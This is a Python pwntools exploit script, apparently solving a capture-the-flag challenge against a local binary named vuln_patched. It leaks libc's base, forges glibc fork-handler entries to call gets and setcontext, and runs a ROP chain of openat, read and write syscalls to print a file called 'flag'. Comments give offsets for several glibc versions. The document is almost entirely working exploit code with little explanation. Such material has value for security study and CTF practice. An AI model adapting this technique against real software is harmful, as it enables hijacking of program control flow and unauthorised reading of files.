#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

io = process("./vuln_patched")
# io = remote("localhost", 9999)

libc = ELF("./libc.so.6")

# glibc 2.28-2.35
# HANDLER_SZ, HAS_ID = 0x20, False
# glibc 2.36+
HANDLER_SZ, HAS_ID = 0x28, True


def header(array_ptr, used):
    return p64(used) * 2 + p64(array_ptr)


def handler_array(*funcs):
    assert funcs
    n = len(funcs)
    total = HANDLER_SZ * n - (0x18 if not HAS_ID else 0)
    data = bytearray(total)

    for i, fn in enumerate(funcs[::-1]):
        off = i * HANDLER_SZ
        data[off : off + 8] = p64(fn)
        if HAS_ID:
            data[off + 0x20 : off + 0x28] = p64(i)

    """
    After testing, when using libc's system() and /bin/sh,
    there's no need to fill the trailing zeros. Only if
    writing a custom /bin/sh string, the trailing zeros
    are needed to avoid issues, but also, just aligning to
    8 bytes is sufficient. Add a b"\x00\x00" e.g. is enough,
    like return bytes(data).rstrip(b'\x00') + b"\x00\x00".
    """
    return bytes(data).rstrip(b"\x00") + b"\x00\x00"


def forge(base, *funcs, rdi=None):
    assert funcs
    n = len(funcs)

    if rdi is None:
        used = n
        array_ptr = base + 0x18
    else:
        used = rdi
        array_ptr = (base + 0x18 - (used - n) * HANDLER_SZ) & 0xFFFFFFFFFFFFFFFF

    return header(array_ptr, used) + handler_array(*funcs)


def build_ucontext(rsp, rip, rdi=0, rsi=0, rdx=0):
    frame = SigreturnFrame()
    frame.rsp = rsp
    frame.rip = rip
    frame.rdi = rdi
    frame.rsi = rsi
    frame.rdx = rdx
    setattr(frame, "&fpstate", rsp + 0x1A8)
    fpstate = {
        0x00: p16(0x37F),
        0x02: p16(0xFFFF),
        0x04: p16(0x0),
        0x06: p16(0xFFFF),
        0x08: 0xFFFFFFFF,
        0x10: 0x0,
        0x18: 0x1F80,
    }
    return flat(
        {
            0x00: bytes(frame),
            0x128: 0,
            0x1A8: fpstate,
        }
    )


io.recvuntil(b"gift: ")
leak_line = io.recvline().strip()
stdin_leak = int(leak_line, 16)
log.success(f"stdin leak: {hex(stdin_leak)}")

libc.address = stdin_leak - libc.sym["_IO_2_1_stdin_"]
log.success(f"libc base: {hex(libc.address)}")

# After my local tests, following are the addresses of fork_handlers in different glibc versions.
# For glibc 2.31:
# objdump -d libc.so.6 | grep "<__abort_msg@@GLIBC_PRIVATE+0xbe0>"
# For glibc 2.35:
# objdump -d libc.so.6 | grep "<getdate_err@@GLIBC_2.2.5+0x300>"
# For glibc 2.39/2.41/2.42:
# objdump -d libc.so.6 | grep "<re_syntax_options@@GLIBC_2.2.5+0x80>"
fork_handlers = libc.sym.re_syntax_options + 0x80
log.success(f"fork_handlers: {hex(fork_handlers)}")

rop = ROP(libc)
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]

BUF_SIZE = 0x80
ctx_addr = fork_handlers + 0x200


def build_chain(buf_addr, path_addr):
    return flat(
        [
            pop_rdi,
            0xFFFFFFFFFFFFFF9C,  # AT_FDCWD
            pop_rsi,
            path_addr,
            pop_rdx,
            0,
            pop_rax,
            constants.SYS_openat,
            syscall,
            pop_rdi,
            3,
            pop_rsi,
            buf_addr,
            pop_rdx,
            BUF_SIZE,
            pop_rax,
            constants.SYS_read,
            syscall,
            pop_rdi,
            1,
            pop_rsi,
            buf_addr,
            pop_rdx,
            BUF_SIZE,
            pop_rax,
            constants.SYS_write,
            syscall,
            pop_rdi,
            0,
            pop_rax,
            constants.SYS_exit,
            syscall,
        ]
    )


ucontext_size = len(build_ucontext(0, 0))
rop_addr = ctx_addr + ucontext_size
ucontext = build_ucontext(rop_addr, ret)
chain = build_chain(0, 0)
buf_addr = rop_addr + len(chain)
path_addr = buf_addr + BUF_SIZE
chain = build_chain(buf_addr, path_addr)

payload1 = forge(fork_handlers, libc.sym.gets, libc.sym.setcontext, rdi=ctx_addr)

payload2 = ucontext
payload2 += chain
payload2 += b"\x00" * BUF_SIZE
payload2 += b"flag\x00"

if b"\n" in payload2:
    raise ValueError("payload2 contains newline; try again due to ASLR")

req1 = p64(fork_handlers) + p64(len(payload1))

io.send(req1)
io.send(payload1)
io.sendline(payload2)

io.interactive()
